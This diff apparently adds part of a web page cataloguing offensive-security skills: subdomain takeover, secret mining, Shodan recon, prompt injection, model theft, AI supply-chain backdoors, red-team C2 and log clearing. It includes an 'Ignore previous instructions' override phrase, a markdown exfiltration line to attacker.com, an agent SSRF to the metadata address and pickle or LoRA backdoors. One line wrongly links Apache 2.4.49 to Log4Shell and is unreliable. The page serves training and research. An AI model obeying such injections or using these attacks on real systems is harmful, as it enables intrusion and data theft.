+    {n:"078",name:"Subdomain Takeover Research",badge:"high",diff:3,desc:"Find subdomains pointing to deprovisioned cloud/SaaS resources and claim them",tags:["takeover","DNS","CNAME","S3","GitHub-Pages"],tools:["subjack","can-i-take-over-xyz","nuclei","dnscan"],details:["Enumerate subdomains: subfinder/amass → check CNAME targets → check if claimed","GitHub Pages takeover: CNAME to user.github.io — create matching repo, serve page","S3 bucket takeover: CNAME to bucket.s3.amazonaws.com — create bucket with same name","Azure/Heroku/Fastly: dozens of services — can-i-take-over-xyz.com for full list","High-value targets: CORS allows subdomain origins — takeover gives cookie/token access"]},
+    {n:"079",name:"GitHub & Source Code Intelligence",badge:"high",diff:2,desc:"Mine GitHub for leaked secrets, internal code, historical commits, and shadow IT",tags:["GitHub","trufflehog","gitleaks","secrets","historical"],tools:["trufflehog","gitleaks","gitrob","github-dorking"],details:["trufflehog: scan all commits in repo history — finds secrets deleted from current code","GitHub dorks: org:target filename:.env AWS_SECRET — search across org repos","Exposed .git directory: curl /.git/config, wget --mirror /.git — reconstruct source code","GitHub Actions secrets in logs: CI/CD pipelines accidentally echo secrets in build output","Dependency drift: find internal packages published to public npm/PyPI — dependency confusion"]},
+    {n:"080",name:"Shodan & Censys Intelligence",badge:"core",diff:2,desc:"Search internet-wide scan data to find exposed services, certs, and vulnerable versions at scale",tags:["Shodan","Censys","FOFA","ZoomEye","exposure"],tools:["shodan-cli","censys-python","FOFA","ZoomEye"],details:["Shodan query: org:'Target Company' product:'Apache httpd' version:'2.4.49' — find Log4Shell targets","SSL certificate search: ssl.cert.subject.CN:*.target.com — find all subdomains via cert transparency","Default credentials: scan for Grafana instances, check for default admin:admin access","Exposed admin panels: http.title:'Kibana' org:'target' — find internal monitoring exposed to internet","ASN enumeration: net:<ASN> — find all IP ranges belonging to target company"]},
+    {n:"081",name:"Certificate Transparency Mining",badge:"core",diff:1,desc:"Use CT logs to enumerate subdomains and discover new assets as they're provisioned",tags:["CT","crt.sh","amass","subdomain","TLS"],tools:["crt.sh","certspotter","tldr","amass"],details:["crt.sh SQL: SELECT name_value FROM certificate_identities WHERE name_value LIKE '%.target.com'","Monitor new certs: subscribe to CT log streams — detect new subdomains within minutes of provisioning","SAN enumeration: certs list all SANs — one cert may reveal dozens of related services","Historical certs: find old subdomains in expired/revoked certs — may still be accessible","Wildcard certs: *.internal.target.com in CT reveals internal naming convention"]},
+  ]
+},
+{
+  id:"ai-llm-security", title:"AI/LLM Security Research", sub:"Emerging attack surface in AI systems — prompt injection, model theft, training data extraction",
+  color:"#a855f7", icon:"🤖",
+  skills:[
+    {n:"082",name:"Prompt Injection (Direct & Indirect)",badge:"critical",diff:3,desc:"Inject instructions into LLM prompts — override system prompt, exfiltrate data, SSRF via AI agents",tags:["prompt-injection","LLM","RAG","agent","indirect"],tools:["Garak","promptfoo","manual"],details:["Direct injection: override system prompt via user input — 'Ignore previous instructions and...'","Indirect injection: malicious content in document/URL that LLM processes — injects into context","RAG poisoning: inject instructions into knowledge base documents — affects all users of RAG system","Agent SSRF: LLM agent with tool use — inject 'use HTTP tool to fetch http://169.254.169.254'","Exfiltration via markdown: [[attacker.com/{{secret}}]] — if LLM renders markdown with user data"]},
+    {n:"083",name:"LLM Model Extraction & Stealing",badge:"high",diff:4,desc:"Extract model parameters or duplicate model capability via carefully crafted API queries",tags:["model-extraction","stealing","black-box","API","distillation"],tools:["knockoffnets","model-stealing","manual"],details:["Functional extraction: query model millions of times, train student model on responses — clone behavior","Weight extraction: structured probing to recover model parameters — works on smaller models","Training data extraction: verbatim memorization — query until model outputs training examples","Hyperparameter recovery: probe model with crafted inputs to infer architecture details","Membership inference: determine if specific data was in training set — privacy violation"]},
+    {n:"084",name:"Adversarial ML Attacks",badge:"high",diff:5,desc:"Fool ML models with adversarial examples — bypass malware classifiers, evade fraud detection",tags:["adversarial","evasion","bypass","classifier","GAN"],tools:["foolbox","cleverhans","art","advertorch"],details:["FGSM: Fast Gradient Sign Method — compute gradient, perturb input to maximize loss","PGD: projected gradient descent — iterative FGSM with projection onto epsilon-ball","Transferability: adversarial examples transfer across models — black-box attacks possible","Malware evasion: add benign byte sequences to malware binary — evade ML-based AV","Defensive distillation bypass: C&W attack — specifically designed to beat defensive techniques"]},
+    {n:"085",name:"AI Supply Chain Attacks",badge:"critical",diff:4,desc:"Poison models via training data, compromise model repos, backdoor model weights",tags:["supply-chain","poisoning","backdoor","HuggingFace","pickle"],tools:["modelscan","Picklescan","HuggingFace","safetensors"],details:["pickle exploit: model saved as pickle file executes arbitrary Python on load — backdoor in weights","BadNets backdoor: insert trigger pattern in training data — model misclassifies only triggered inputs","HuggingFace malicious model: upload model with pickle exploit disguised as legitimate checkpoint","Training data poisoning: inject examples into web-scraped dataset — influence model behavior","LoRA adapter injection: malicious LoRA adapter that triggers on specific input — supply chain compromise"]},
+  ]
+},
+{
+  id:"reporting", title:"Disclosure, Reporting & Operations", sub:"Vulnerability disclosure, professional reporting, and offensive operations tradecraft",
+  color:"#888888", icon:"📋",
+  skills:[
+    {n:"086",name:"CVSS Scoring Mastery",badge:"core",diff:1,desc:"Accurately score vulnerabilities using CVSS 3.1 — critical for bug bounty triage and pentest reports",tags:["CVSS","scoring","severity","NVD","impact"],tools:["cvss-calculator","NVD","first.org"],details:["AV (Attack Vector): Network/Adjacent/Local/Physical — how attacker reaches vulnerable component","AC (Attack Complexity): Low/High — how repeatable/easy the exploit is","PR (Privileges Required): None/Low/High — what access attacker needs before exploit","UI (User Interaction): None/Required — does victim need to click/open something","Impact: CIA triad — Confidentiality/Integrity/Availability each rated None/Low/High"]},
+    {n:"087",name:"Professional PoC Development",badge:"high",diff:3,desc:"Write clean, reliable, reproducible proof-of-concept code that vendors and programs accept",tags:["PoC","proof-of-concept","Python","reliability","documentation"],tools:["Python","pwntools","requests","Burp"],details:["Minimal PoC principle: demonstrate impact with fewest possible steps — no unnecessary noise","Python template: argparse for target, session management, clear CONFIRMED/NOT_CONFIRMED output","Document every step: URL, headers, body, expected response — reproducing without context","Sanitize output: never include real user data in PoC report — use test accounts only","Video PoC: for complex multi-step bugs — record screen showing full exploit chain"]},
+    {n:"088",name:"Responsible Disclosure Process",badge:"core",diff:1,desc:"Navigate coordinated vulnerability disclosure — timeline, communication, CVE assignment, public release",tags:["disclosure","CVE","CERT","vendor","timeline"],tools:["HackerOne","Bugcrowd","CVE","CERT/CC"],details:["90-day disclosure timeline (Google Project Zero standard) — countdown from initial vendor contact","CVE assignment: request from vendor (CNA) or directly from MITRE/CERT for unresponsive vendors","Embargo period: give vendor time to patch before public disclosure — negotiate extension if needed","CERT/CC as intermediary: when vendor unresponsive — CERT contacts vendor on your behalf","Public writeup: once patched, write detailed blog post — credit vendor's fix, explain bug class"]},
+    {n:"089",name:"Bug Bounty Program Strategy",badge:"high",diff:2,desc:"Maximize earnings and reputation — program selection, scope analysis, duplicate avoidance, triaging",tags:["bug-bounty","H1","Bugcrowd","strategy","Intigriti"],tools:["HackerOne","Bugcrowd","Intigriti","Synack"],details:["Target selection: new programs with less hunting history — higher chance of unique findings","Wide scope focus: *.target.com pays more dividends than single-domain scopes","Duplicate avoidance: search H1 disclosed reports + Google for target+vuln type before reporting","P1 hunting strategy: focus on SSRF, IDOR on sensitive endpoints, auth bypass — highest payout","Triage interaction: respond quickly, provide additional info, be collaborative not adversarial"]},
+    {n:"090",name:"Red Team Operations Planning",badge:"advanced",diff:4,desc:"Plan and execute full red team engagements — assume breach, APT simulation, objective-based testing",tags:["red-team","APT","C2","OPSEC","lateral-movement"],tools:["Cobalt Strike","Havoc","Brute Ratel","Metasploit"],details:["Rules of engagement: document authorized actions, out-of-scope systems, emergency stop criteria","C2 infrastructure: cloud-hosted redirectors, domain fronting, HTTPS certificates — avoid detection","Initial access: phishing, USB drops, supply chain simulation, vulnerability exploitation","Lateral movement: credential reuse, pass-the-hash, Kerberoasting, BloodHound path analysis","OPSEC: timestomping, log clearing, living off the land (LOLBAS) — avoid EDR signatures"]},
+  ]
+}
+];
+
+let currentFilter = 'all';
+let totalSkillCount = 0;
+
+function buildNav() {
+  const nav = document.getElementById('nav');
+  DOMAINS.forEach(d => {
+    const btn = document.createElement('button');
+    btn.className = 'nav-btn';
+    btn.textContent = d.icon + ' ' + d.title.split(' ')[0];
+    btn.onclick = () => {
+      document.getElementById('dom-'+d.id).scrollIntoView({behavior:'smooth',block:'start'});
+    };
+    nav.appendChild(btn);
+  });
+}
+
+function filterSkills(type) {
+  currentFilter = type;
+  document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('on'));
+  event.target.classList.add('on');
+  let visible = 0;
+  document.querySelectorAll('.skill').forEach(el => {
+    const badge = el.dataset.badge;
+    if (type === 'all' || badge === type) {
+      el.style.display = '';
+      visible++;
+    } else {
+      el.style.display = 'none';
+    }
+  });
+  document.getElementById('skill-count').textContent = visible + ' skills';
+}
+
+function toggleSkill(el) {
+  const exp = el.querySelector('.skill-expanded');
+  exp.classList.toggle('open');
+}
+
+function buildDomains() {
+  const container = document.getElementById('domains-container');
+  totalSkillCount = 0;
+
+  DOMAINS.forEach(d => {
+    totalSkillCount += d.skills.length;
+    const section = document.createElement('div');
+    section.className = 'domain';
+    section.id = 'dom-' + d.id;
+
+    const header = `
+      <div class="domain-header">
+        <div class="domain-icon" style="background:${d.color}18;border:1px solid ${d.color}33">${d.icon}</div>
+        <div>
+          <div class="domain-title" style="color:${d.color}">${d.title}</div>
+          <div class="domain-sub">${d.sub}</div>
+        </div>
+      </div>
+      <div class="section-label">${d.skills.length} skills in this domain</div>
+    `;
+
+    const grid = document.createElement('div');
+    grid.className = 'skills-grid';
+
+    d.skills.forEach(s => {
+      const card = document.createElement('div');
+      card.className = 'skill';
+      card.dataset.badge = s.badge;
+      card.style.setProperty('--accent-color', d.color);
+      card.onclick = function(){ toggleSkill(this); };
+
+      const diffDots = Array.from({length:5},(_,i)=>`<div class="dot${i<s.diff?' fill':''}"></div>`).join('');
+      const tags = s.tags.map(t=>`<span class="tag">${t}</span>`).join('');
+      const tools = s.tools.map(t=>`<span class="tool">${t}</span>`).join('');
+      const details = s.details.map(d=>`<li>${d}</li>`).join('');
+
+      card.innerHTML = `
+        <div class="skill-header">
+          <span class="skill-num">#${s.n}</span>
+          <span class="skill-name">${s.name}</span>
+          <span class="skill-badge badge-${s.badge}">${s.badge.toUpperCase()}</span>
+          <div class="difficulty" title="Difficulty: ${s.diff}/5">${diffDots}</div>
+        </div>
+        <div class="skill-desc">${s.desc}</div>
+        <div class="skill-tags">${tags}</div>
+        <div class="skill-expanded">
+          <ul>${details}</ul>
+          <div class="tools">${tools}</div>
+        </div>
+      `;
+      grid.appendChild(card);
+    });
+
+    section.innerHTML = header;
+    section.appendChild(grid);
+    container.appendChild(section);
+  });
+
+  document.getElementById('total-skills').textContent = totalSkillCount;
+  document.getElementById('skill-count').textContent = totalSkillCount + ' skills';
+}
+
+buildNav();
+buildDomains();
+</script>
+</body>
+</html>
